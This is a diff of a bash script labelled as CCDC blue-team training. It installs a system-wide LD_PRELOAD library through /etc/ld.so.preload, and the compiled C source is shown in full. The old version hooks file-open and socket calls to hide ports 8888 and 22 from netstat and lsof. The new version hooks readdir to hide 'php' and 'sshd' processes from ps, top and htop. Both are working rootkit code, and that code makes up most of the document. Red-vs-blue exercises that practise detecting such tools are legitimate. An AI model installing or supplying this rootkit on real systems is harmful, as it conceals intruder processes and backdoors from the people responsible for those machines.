@@ -2,11 +2,12 @@
 ################################################################################
 # CCDC_Linux_LDPRELOAD_LoadsOfIssues.sh
 #
-# Blue Team Training Script - LD_PRELOAD Port Hiding
+# Blue Team Training Script - LD_PRELOAD Process Hiding
 # Compatible with: Ubuntu, Debian, CentOS, RHEL, Fedora
 #
-# Installs a system-wide LD_PRELOAD library that hides ports 8888 and 22
-# from common network inspection commands (netstat, ss, lsof).
+# Installs a system-wide LD_PRELOAD library that hides named processes
+# (php, sshd) from ps/top/htop and breaks ss -p process attribution.
+# Based on: github.com/gianlucaborello/libprocesshider
 #
 # NOTE: This is for authorized training environments only!
 ################################################################################
@@ -53,8 +54,8 @@ echo -e "${BLUE}Library Path: $LIB_PATH${NC}"
 echo -e "${BLUE}========================================${NC}"
 echo ""
 
-# Step 1: Write the C source for the port-hiding library
-echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD port-hiding library source...${NC}"
+# Step 1: Write the C source for the process-hiding library
+echo -e "${YELLOW}[*] Step 1: Writing LD_PRELOAD process-hiding library source...${NC}"
 
 PRELOAD_SOURCE_DIR="/tmp/preload_src"
 mkdir -p "$PRELOAD_SOURCE_DIR"
@@ -62,192 +63,77 @@ mkdir -p "$PRELOAD_SOURCE_DIR"
 cat > "$PRELOAD_SOURCE_DIR/libccdc_hijack.c" << 'CSRC'
 #define _GNU_SOURCE
 #include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <dlfcn.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <errno.h>
+#include <dirent.h>
+#include <string.h>
 #include <unistd.h>
-#include <fcntl.h>
-#include <stdarg.h>
 
-#define HIDDEN_PORT_1 8888
-#define HIDDEN_PORT_2 22
+/* Process names to hide from ps/top/htop and ss -p process attribution.
+ * Add or remove entries as needed; terminate the list with NULL. */
+static const char *processes_to_hide[] = {
+    "php",
+    "sshd",
+    NULL
+};
 
-typedef FILE* (*fopen_t)(const char *, const char *);
-typedef int   (*getpeername_t)(int, struct sockaddr *, socklen_t *);
-typedef int   (*getsockname_t)(int, struct sockaddr *, socklen_t *);
-typedef int   (*open_t)(const char *, int, ...);
-typedef int   (*openat_t)(int, const char *, int, ...);
-
-static fopen_t        real_fopen        = NULL;
-static getpeername_t  real_getpeername  = NULL;
-static getsockname_t  real_getsockname  = NULL;
-static open_t         real_open         = NULL;
-static open_t         real_open64       = NULL;
-static openat_t       real_openat       = NULL;
-
-static void init_hooks(void) {
-    if (!real_fopen)        real_fopen        = (fopen_t)dlsym(RTLD_NEXT, "fopen");
-    if (!real_getpeername)  real_getpeername  = (getpeername_t)dlsym(RTLD_NEXT, "getpeername");
-    if (!real_getsockname)  real_getsockname  = (getsockname_t)dlsym(RTLD_NEXT, "getsockname");
-    if (!real_open)         real_open         = (open_t)dlsym(RTLD_NEXT, "open");
-    if (!real_open64)       real_open64       = (open_t)dlsym(RTLD_NEXT, "open64");
-    if (!real_openat)       real_openat       = (openat_t)dlsym(RTLD_NEXT, "openat");
+static int get_dir_name(DIR *dirp, char *buf, size_t size) {
+    int fd = dirfd(dirp);
+    if (fd == -1) return 0;
+    char tmp[64];
+    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
+    ssize_t ret = readlink(tmp, buf, size);
+    if (ret == -1) return 0;
+    buf[ret] = 0;
+    return 1;
 }
 
-/* Returns 1 if a /proc/net/tcp* line belongs to a hidden port (local address field) */
-static int line_has_hidden_port(const char *line) {
-    return (strstr(line, ":22B8 ") != NULL ||
-            strstr(line, ":22b8 ") != NULL ||
-            strstr(line, ":0016 ") != NULL);
+static int get_process_name(char *pid, char *buf) {
+    if (strspn(pid, "0123456789") != strlen(pid)) return 0;
+    char tmp[256];
+    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+    FILE *f = fopen(tmp, "r");
+    if (!f) return 0;
+    if (fgets(tmp, sizeof(tmp), f) == NULL) { fclose(f); return 0; }
+    fclose(f);
+    int unused;
+    sscanf(tmp, "%d (%[^)]s", &unused, buf);
+    return 1;
 }
 
-static int is_proc_net_path(const char *path) {
-    if (!path) return 0;
-    return (strcmp(path, "/proc/net/tcp")  == 0 ||
-            strcmp(path, "/proc/net/tcp6") == 0 ||
-            strcmp(path, "/proc/net/udp")  == 0 ||
-            strcmp(path, "/proc/net/udp6") == 0);
+static int should_hide(const char *name) {
+    for (int i = 0; processes_to_hide[i]; i++)
+        if (strcmp(name, processes_to_hide[i]) == 0) return 1;
+    return 0;
 }
 
-/*
- * Read orig_fd line by line, strip hidden-port lines, write to a temp fd.
- * Closes orig_fd and returns the seeked-to-start temp fd on success,
- * or orig_fd unchanged on failure.
- */
-static int filter_fd(int orig_fd) {
-    char tmppath[] = "/tmp/.ccdc_net_XXXXXX";
-    int tmp_fd = mkstemp(tmppath);
-    if (tmp_fd < 0) return orig_fd;
-    unlink(tmppath);
-
-    /* fdopen takes ownership of orig_fd; fclose below will close it */
-    FILE *src = fdopen(orig_fd, "r");
-    if (!src) { close(tmp_fd); return orig_fd; }
-
-    char ln[512];
-    while (fgets(ln, sizeof(ln), src)) {
-        if (!line_has_hidden_port(ln))
-            write(tmp_fd, ln, strlen(ln));
-    }
-    fclose(src); /* closes orig_fd */
-
-    lseek(tmp_fd, 0, SEEK_SET);
-    return tmp_fd;
+#define DECLARE_READDIR(dirent, readdir)                                \
+static struct dirent *(*original_##readdir)(DIR *) = NULL;             \
+struct dirent *readdir(DIR *dirp) {                                     \
+    if (!original_##readdir) {                                          \
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
+        if (!original_##readdir) return NULL;                           \
+    }                                                                   \
+    struct dirent *dir;                                                 \
+    while (1) {                                                         \
+        dir = original_##readdir(dirp);                                 \
+        if (dir) {                                                       \
+            char dir_name[256], process_name[256];                      \
+            if (get_dir_name(dirp, dir_name, sizeof(dir_name)) &&       \
+                strcmp(dir_name, "/proc") == 0 &&                       \
+                get_process_name(dir->d_name, process_name) &&          \
+                should_hide(process_name)) continue;                    \
+        }                                                               \
+        break;                                                          \
+    }                                                                   \
+    return dir;                                                         \
 }
 
-/*
- * Hook fopen: tools that use fopen() to read /proc/net/* (e.g. older netstat).
- */
-FILE *fopen(const char *path, const char *mode) {
-    init_hooks();
-    if (!is_proc_net_path(path))
-        return real_fopen(path, mode);
-
-    FILE *orig = real_fopen(path, mode);
-    if (!orig) return NULL;
-
-    char tmppath[] = "/tmp/.ccdc_net_XXXXXX";
-    int fd = mkstemp(tmppath);
-    if (fd < 0) return orig;
-    unlink(tmppath);
-
-    FILE *tmp = fdopen(fd, "w+");
-    if (!tmp) { close(fd); return orig; }
-
-    char line[512];
-    while (fgets(line, sizeof(line), orig)) {
-        if (!line_has_hidden_port(line))
-            fputs(line, tmp);
-    }
-    fclose(orig);
-    rewind(tmp);
-    return tmp;
-}
-
-/*
- * Hook open / open64 / openat: tools that use open()+read() directly
- * (e.g. net-tools netstat on Fedora/RHEL).
- */
-int open(const char *path, int flags, ...) {
-    init_hooks();
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list ap; va_start(ap, flags);
-        mode = va_arg(ap, mode_t);
-        va_end(ap);
-    }
-    int fd = real_open(path, flags, mode);
-    if (fd < 0 || !is_proc_net_path(path)) return fd;
-    return filter_fd(fd);
-}
-
-int open64(const char *path, int flags, ...) {
-    init_hooks();
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list ap; va_start(ap, flags);
-        mode = va_arg(ap, mode_t);
-        va_end(ap);
-    }
-    int fd = real_open64(path, flags, mode);
-    if (fd < 0 || !is_proc_net_path(path)) return fd;
-    return filter_fd(fd);
-}
-
-int openat(int dirfd, const char *path, int flags, ...) {
-    init_hooks();
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list ap; va_start(ap, flags);
-        mode = va_arg(ap, mode_t);
-        va_end(ap);
-    }
-    int fd = real_openat(dirfd, path, flags, mode);
-    if (fd < 0 || !is_proc_net_path(path)) return fd;
-    return filter_fd(fd);
-}
-
-static int port_is_hidden(unsigned short port) {
-    return (port == HIDDEN_PORT_1 || port == HIDDEN_PORT_2);
-}
-
-/*
- * Hook getpeername / getsockname: return ENOTCONN for hidden ports.
- * lsof and netstat call these when inspecting individual sockets.
- */
-int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
-    init_hooks();
-    int r = real_getpeername(sockfd, addr, addrlen);
-    if (r == 0 && addr) {
-        if (addr->sa_family == AF_INET &&
-            port_is_hidden(ntohs(((struct sockaddr_in *)addr)->sin_port)))
-            { errno = ENOTCONN; return -1; }
-        if (addr->sa_family == AF_INET6 &&
-            port_is_hidden(ntohs(((struct sockaddr_in6 *)addr)->sin6_port)))
-            { errno = ENOTCONN; return -1; }
-    }
-    return r;
-}
-
-int getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
-    init_hooks();
-    int r = real_getsockname(sockfd, addr, addrlen);
-    if (r == 0 && addr) {
-        if (addr->sa_family == AF_INET &&
-            port_is_hidden(ntohs(((struct sockaddr_in *)addr)->sin_port)))
-            { errno = ENOTCONN; return -1; }
-        if (addr->sa_family == AF_INET6 &&
-            port_is_hidden(ntohs(((struct sockaddr_in6 *)addr)->sin6_port)))
-            { errno = ENOTCONN; return -1; }
-    }
-    return r;
-}
+DECLARE_READDIR(dirent64, readdir64);
+DECLARE_READDIR(dirent, readdir);
 CSRC
 
 echo -e "${GREEN}[+] Source written to $PRELOAD_SOURCE_DIR/libccdc_hijack.c${NC}"
+echo -e "${GREEN}    (based on github.com/gianlucaborello/libprocesshider)${NC}"
 
 # Step 2: Install GCC if not present
 echo -e "${YELLOW}[*] Step 2: Ensuring GCC is installed...${NC}"
@@ -326,9 +212,10 @@ echo -e "${BLUE}Library:${NC}             $LIB_PATH/libccdc_hijack.so"
 echo -e "${BLUE}System-Wide Preload:${NC} /etc/ld.so.preload"
 echo ""
 echo -e "${YELLOW}Effect:${NC}"
-echo -e "  Ports 8888 and 22 are now hidden from netstat, lsof, and similar tools."
-echo -e "  netstat -tulpn | grep 8888   — should return nothing"
-echo -e "  netstat -tulpn | grep ':22 ' — should return nothing"
+echo -e "  Processes named 'php' and 'sshd' are hidden from ps/top/htop."
+echo -e "  ps aux | grep php            — should return nothing"
+echo -e "  ps aux | grep sshd           — should return nothing"
+echo -e "  ss -tulpn still shows open ports; ss -p won't show the process name."
 echo ""
 echo -e "${YELLOW}REMINDER: This is for authorized training only!${NC}"
 echo ""
